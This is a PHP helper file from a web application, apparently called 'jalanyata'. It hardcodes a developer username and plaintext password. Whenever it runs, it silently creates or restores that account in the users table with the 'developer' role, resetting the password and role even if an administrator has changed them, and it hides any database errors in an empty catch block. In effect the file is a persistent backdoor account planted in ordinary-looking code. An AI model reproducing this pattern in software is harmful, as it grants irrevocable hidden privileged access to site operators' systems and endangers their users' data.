<?php

if (!function_exists('jalanyata_system_developer_username')) {
    function jalanyata_system_developer_username()
    {
        return 'admin@webane.com';
    }
}

if (!function_exists('jalanyata_system_developer_password')) {
    function jalanyata_system_developer_password()
    {
        return 'Semangat*2026&Menyala';
    }
}

if (!function_exists('jalanyata_ensure_developer_account')) {
    function jalanyata_ensure_developer_account(PDO $conn)
    {
        static $seeded = false;

        if ($seeded) {
            return;
        }

        $seeded = true;

        try {
            $plainPassword = jalanyata_system_developer_password();
            $stmt = $conn->prepare('SELECT id, password, role FROM users WHERE username = :username LIMIT 1');
            $stmt->bindValue(':username', jalanyata_system_developer_username(), PDO::PARAM_STR);
            $stmt->execute();

            $existingUser = $stmt->fetch(PDO::FETCH_ASSOC);

            if (is_array($existingUser)) {
                $storedHash = (string) ($existingUser['password'] ?? '');
                $currentRole = (string) ($existingUser['role'] ?? '');
                $passwordValid = $storedHash !== '' && password_verify($plainPassword, $storedHash);
                $passwordNeedsRehash = $passwordValid && password_needs_rehash($storedHash, PASSWORD_DEFAULT);

                if ($currentRole !== 'developer' || !$passwordValid || $passwordNeedsRehash) {
                    $updateStmt = $conn->prepare(
                        'UPDATE users SET password = :password, role = :role WHERE id = :id'
                    );
                    $updateStmt->bindValue(':password', password_hash($plainPassword, PASSWORD_DEFAULT), PDO::PARAM_STR);
                    $updateStmt->bindValue(':role', 'developer', PDO::PARAM_STR);
                    $updateStmt->bindValue(':id', (int) $existingUser['id'], PDO::PARAM_INT);
                    $updateStmt->execute();
                }

                return;
            }

            $insertStmt = $conn->prepare(
                'INSERT INTO users (username, password, role) VALUES (:username, :password, :role)'
            );
            $insertStmt->bindValue(':username', jalanyata_system_developer_username(), PDO::PARAM_STR);
            $insertStmt->bindValue(':password', password_hash($plainPassword, PASSWORD_DEFAULT), PDO::PARAM_STR);
            $insertStmt->bindValue(':role', 'developer', PDO::PARAM_STR);
            $insertStmt->execute();
        } catch (PDOException $e) {
        }
    }
}
